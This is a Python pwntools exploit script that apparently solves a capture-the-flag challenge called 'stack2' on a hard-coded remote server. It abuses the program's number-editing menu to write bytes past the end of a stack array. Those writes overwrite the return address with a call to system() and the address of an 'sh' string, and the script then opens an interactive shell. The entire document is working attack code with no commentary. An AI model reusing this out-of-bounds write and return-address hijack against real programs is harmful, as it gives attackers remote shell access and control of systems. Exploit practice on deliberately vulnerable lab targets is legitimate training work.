from pwn import *

ret_addr = 0xffffcddc
ebp_addr = 0xffffcdc8
call_system = 0x80485b4
sh_addr = 0x8048987


def num_init(r: remote):
    r.sendlineafter("How many numbers you have:", b"1")
    r.sendlineafter("Give me your numbers", b"1")


def change_numbers(r: remote, offset: int, num: int):
    r.sendlineafter("5. exit\n", b"3")
    r.sendlineafter("which number to change:\n", str.encode(str(offset)))
    r.sendlineafter("new number:\n", str.encode(str(num)))


# r = process("./stack2")
r = remote("111.200.241.244", 53677)

num_init(r)
change_numbers(r, ret_addr - ebp_addr + 0x70, 0xb4)
change_numbers(r, ret_addr - ebp_addr + 0x71, 0x85)
change_numbers(r, ret_addr - ebp_addr + 0x72, 0x4)
change_numbers(r, ret_addr - ebp_addr + 0x73, 0x8)
change_numbers(r, ret_addr - ebp_addr + 0x74, 0x87)
change_numbers(r, ret_addr - ebp_addr + 0x75, 0x89)
change_numbers(r, ret_addr - ebp_addr + 0x76, 0x4)
change_numbers(r, ret_addr - ebp_addr + 0x77, 0x8)

r.sendline(b"5")
r.interactive()
